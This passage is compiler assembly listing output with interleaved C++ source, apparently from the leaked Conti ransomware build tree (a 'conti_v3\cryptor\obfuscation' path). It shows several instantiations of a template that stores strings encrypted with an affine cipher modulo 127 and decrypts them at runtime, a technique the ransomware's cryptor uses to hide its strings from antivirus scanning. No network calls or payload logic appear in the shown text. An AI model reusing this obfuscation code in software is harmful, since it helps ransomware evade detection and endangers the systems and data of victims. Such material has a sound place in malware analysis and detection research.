; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GL@$0HM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<107,124,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GL@$0HM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0GL@$0HM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<107,124,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<107,124,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 5d	 mov	 BYTE PTR [rcx+1], 93	; 0000005dH
  00007	c6 41 02 7c	 mov	 BYTE PTR [rcx+2], 124	; 0000007cH
  0000b	c6 41 03 32	 mov	 BYTE PTR [rcx+3], 50	; 00000032H
  0000f	c6 41 04 7c	 mov	 BYTE PTR [rcx+4], 124	; 0000007cH
  00013	c6 41 05 1d	 mov	 BYTE PTR [rcx+5], 29
  00017	c6 41 06 7c	 mov	 BYTE PTR [rcx+6], 124	; 0000007cH
  0001b	c6 41 07 38	 mov	 BYTE PTR [rcx+7], 56	; 00000038H
  0001f	c6 41 08 7c	 mov	 BYTE PTR [rcx+8], 124	; 0000007cH
  00023	c6 41 09 7c	 mov	 BYTE PTR [rcx+9], 124	; 0000007cH
  00027	c6 41 0a 7c	 mov	 BYTE PTR [rcx+10], 124	; 0000007cH
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0GL@$0HM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<107,124,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<107,124,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GN@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0GN@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<109,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 2d	 sub	 ecx, 45			; 0000002dH

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 07	 imul	 r8d, ecx, 7

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GN@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<109,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GN@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0GN@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<109,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<109,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 6a	 mov	 BYTE PTR [rcx+1], 106	; 0000006aH
  00007	c6 41 02 2d	 mov	 BYTE PTR [rcx+2], 45	; 0000002dH
  0000b	c6 41 03 73	 mov	 BYTE PTR [rcx+3], 115	; 00000073H
  0000f	c6 41 04 2d	 mov	 BYTE PTR [rcx+4], 45	; 0000002dH
  00013	c6 41 05 17	 mov	 BYTE PTR [rcx+5], 23
  00017	c6 41 06 2d	 mov	 BYTE PTR [rcx+6], 45	; 0000002dH
  0001b	c6 41 07 74	 mov	 BYTE PTR [rcx+7], 116	; 00000074H
  0001f	c6 41 08 2d	 mov	 BYTE PTR [rcx+8], 45	; 0000002dH
  00023	c6 41 09 2d	 mov	 BYTE PTR [rcx+9], 45	; 0000002dH
  00027	c6 41 0a 2d	 mov	 BYTE PTR [rcx+10], 45	; 0000002dH
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0GN@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<109,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<109,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EP@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0EP@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<79,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 78 00 00 00	 mov	 eax, 120		; 00000078H
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 2d	 imul	 ecx, eax, 45		; 0000002dH

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EP@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<79,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0EP@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0EP@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<79,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<79,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 47	 mov	 BYTE PTR [rcx+1], 71	; 00000047H
  00007	c6 41 02 78	 mov	 BYTE PTR [rcx+2], 120	; 00000078H
  0000b	c6 41 03 5f	 mov	 BYTE PTR [rcx+3], 95	; 0000005fH
  0000f	c6 41 04 78	 mov	 BYTE PTR [rcx+4], 120	; 00000078H
  00013	c6 41 05 13	 mov	 BYTE PTR [rcx+5], 19
  00017	c6 41 06 78	 mov	 BYTE PTR [rcx+6], 120	; 00000078H
  0001b	c6 41 07 2f	 mov	 BYTE PTR [rcx+7], 47	; 0000002fH
  0001f	c6 41 08 78	 mov	 BYTE PTR [rcx+8], 120	; 00000078H
  00023	c6 41 09 78	 mov	 BYTE PTR [rcx+9], 120	; 00000078H
  00027	c6 41 0a 78	 mov	 BYTE PTR [rcx+10], 120	; 00000078H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0EP@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<79,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<79,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CJ@$0DH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0CJ@$0DH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<41,55,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 37	 sub	 ecx, 55			; 00000037H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 1f	 imul	 r8d, ecx, 31

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CJ@$0DH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<41,55,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0CJ@$0DH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0CJ@$0DH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<41,55,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<41,55,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 24	 mov	 BYTE PTR [rcx+1], 36	; 00000024H
  00007	c6 41 02 37	 mov	 BYTE PTR [rcx+2], 55	; 00000037H
  0000b	c6 41 03 4f	 mov	 BYTE PTR [rcx+3], 79	; 0000004fH
  0000f	c6 41 04 37	 mov	 BYTE PTR [rcx+4], 55	; 00000037H
  00013	c6 41 05 5f	 mov	 BYTE PTR [rcx+5], 95	; 0000005fH
  00017	c6 41 06 37	 mov	 BYTE PTR [rcx+6], 55	; 00000037H
  0001b	c6 41 07 6c	 mov	 BYTE PTR [rcx+7], 108	; 0000006cH
  0001f	c6 41 08 37	 mov	 BYTE PTR [rcx+8], 55	; 00000037H
  00023	c6 41 09 37	 mov	 BYTE PTR [rcx+9], 55	; 00000037H
  00027	c6 41 0a 37	 mov	 BYTE PTR [rcx+10], 55	; 00000037H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0CJ@$0DH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<41,55,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<41,55,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<101,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 3c 00 00 00	 mov	 eax, 60			; 0000003cH
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 2c	 imul	 ecx, eax, 44		; 0000002cH

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<101,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<101,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<101,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 07	 mov	 BYTE PTR [rcx+1], 7
  00007	c6 41 02 3c	 mov	 BYTE PTR [rcx+2], 60	; 0000003cH
  0000b	c6 41 03 2e	 mov	 BYTE PTR [rcx+3], 46	; 0000002eH
  0000f	c6 41 04 3c	 mov	 BYTE PTR [rcx+4], 60	; 0000003cH
  00013	c6 41 05 42	 mov	 BYTE PTR [rcx+5], 66	; 00000042H
  00017	c6 41 06 3c	 mov	 BYTE PTR [rcx+6], 60	; 0000003cH
  0001b	c6 41 07 5c	 mov	 BYTE PTR [rcx+7], 92	; 0000005cH
  0001f	c6 41 08 3c	 mov	 BYTE PTR [rcx+8], 60	; 0000003cH
  00023	c6 41 09 3c	 mov	 BYTE PTR [rcx+9], 60	; 0000003cH
  00027	c6 41 0a 3c	 mov	 BYTE PTR [rcx+10], 60	; 0000003cH
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<101,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<101,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
